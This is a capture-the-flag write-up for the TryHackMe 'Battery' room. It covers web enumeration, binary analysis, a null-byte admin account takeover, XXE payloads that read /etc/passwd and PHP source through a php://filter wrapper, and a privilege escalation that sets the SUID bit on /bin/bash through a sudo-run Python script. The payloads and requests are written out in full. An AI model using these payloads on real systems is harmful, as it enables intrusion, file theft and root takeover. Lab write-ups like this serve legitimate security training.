# Battery
[TryHackMe room link](https://tryhackme.com/room/battery)

# Informations about the room
> Electricity bill portal has been hacked many times in the past , so we have fired one of the employee from the security team , As a new recruit you need to work like a hacker to find the loop holes in the portal and gain root access to the server .

# Open ports

22 OpenSSH 6.6.1

80 Apache/2.4.7

# Enumeration

Gobuster found various stuff:

```
/.html                (Status: 403) [Size: 283]
/.php                 (Status: 403) [Size: 282]
/index.html           (Status: 200) [Size: 406]
/register.php         (Status: 200) [Size: 715]
/admin.php            (Status: 200) [Size: 663]
/scripts              (Status: 301) [Size: 311] [--> http://10.10.70.20/scripts/]
/forms.php            (Status: 200) [Size: 2334]
/report               (Status: 200) [Size: 16912]
/logout.php           (Status: 302) [Size: 0] [--> admin.php]
/dashboard.php        (Status: 302) [Size: 908] [--> admin.php]
```

The `report` directory downloads a ELF binary

Checking the binary strings we find a list of emails:

```
support@bank.a
contact@bank.a
cyber@bank.a
admins@bank.a
sam@bank.a
admin0@bank.a
super_user@bank.a
control_admin@bank.a
it_admin@bank.a
```

After disassembling the binary we find different functions: 

The first one is the `users` function that lists the emails found previously with strings

The second is the `update` function

```c
void update(char *param_1)

{
  int iVar1;
  
  iVar1 = strcmp(param_1,"admin@bank.a");
  if (iVar1 == 0) {
    puts("Password Updated Successfully!\n");
    options();
  }
  else {
    puts("Sorry you can\'t update the password\n");
    options();
  }
  return;
}
```
In the update function we can see that only the `admin@bank.a` user can change passwords

It's possible to register users in the `/register.php` page

A solution is to takeover the admin account by checking the input validation in the username field

The server is using PHP 5.5.9

We can try to register the admin account again using a NULL character at the end like `%20` or `%00`

```console
POST /admin.php HTTP/1.1
Host: 10.10.70.20
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: http://10.10.70.20
Connection: close
Referer: http://10.10.70.20/admin.php
Cookie: PHPSESSID=nv9ecjqfusv88r8v0m4ln7dc77
Upgrade-Insecure-Requests: 1

uname=admin%40bank.a%00&password=1234&btn=Submit
```

The password is successfully changed 

After logging with the admin account, in the `forms.php` source there are references to XML when doing a POST request

It's possible to try a XXE attack (XML external entity (XXE) injection)

```console
POST /forms.php HTTP/1.1
Host: 10.10.70.20
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/plain;charset=UTF-8
Content-Length: 191
Origin: http://10.10.70.20
Connection: close
Referer: http://10.10.70.20/forms.php
Cookie: PHPSESSID=nv9ecjqfusv88r8v0m4ln7dc77

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<root><name>1</name><search>&xxe;</search></root>
```
This behaves like a LFI but converted to base64 using php 

```
Sorry, account number cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxpYnV1aWQ6eDoxMDA6MTAxOjovdmFyL2xpYi9saWJ1dWlkOgpzeXNsb2c6eDoxMDE6MTA0OjovaG9tZS9zeXNsb2c6L2Jpbi9mYWxzZQptZXNzYWdlYnVzOng6MTAyOjEwNjo6L3Zhci9ydW4vZGJ1czovYmluL2ZhbHNlCmxhbmRzY2FwZTp4OjEwMzoxMDk6Oi92YXIvbGliL2xhbmRzY2FwZTovYmluL2ZhbHNlCnNzaGQ6eDoxMDQ6NjU1MzQ6Oi92YXIvcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4KY3liZXI6eDoxMDAwOjEwMDA6Y3liZXIsLCw6L2hvbWUvY3liZXI6L2Jpbi9iYXNoCm15c3FsOng6MTA3OjExMzpNeVNRTCBTZXJ2ZXIsLCw6L25vbmV4aXN0ZW50Oi9iaW4vZmFsc2UKeWFzaDp4OjEwMDI6MTAwMjosLCw6L2hvbWUveWFzaDovYmluL2Jhc2gK is not active!
```

This is the decoded output :

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
landscape:x:103:109::/var/lib/landscape:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
cyber:x:1000:1000:cyber,,,:/home/cyber:/bin/bash
mysql:x:107:113:MySQL Server,,,:/nonexistent:/bin/false
yash:x:1002:1002:,,,:/home/yash:/bin/bash
```

We can try to read other files in the webroot but the most important one is acc.php

This is the request sent to retrieve this file:
```console
POST /forms.php HTTP/1.1
Host: 10.10.70.20
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/plain;charset=UTF-8
Content-Length: 187
Origin: http://10.10.70.20
Connection: close
Referer: http://10.10.70.20/forms.php
Cookie: PHPSESSID=nv9ecjqfusv88r8v0m4ln7dc77

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=acc.php"> ]>
<root><name>1</name><search>&xxe;</search></root>
```


In the php code there is a comment with plaintext credentials for ssh:
```
//MY CREDS :- cyber:REDACTED
```

After logging in we can see a `run.py` in the home directory

This file can be executed with sudo 

Is in the home directory so it can be removed and another writable custom file can be created 

For some reason i did not manage to get a reverse shell with this method so i put the SUID bit on bash 

```python
import os 
os.system('chmod 4777 /bin/bash')
```
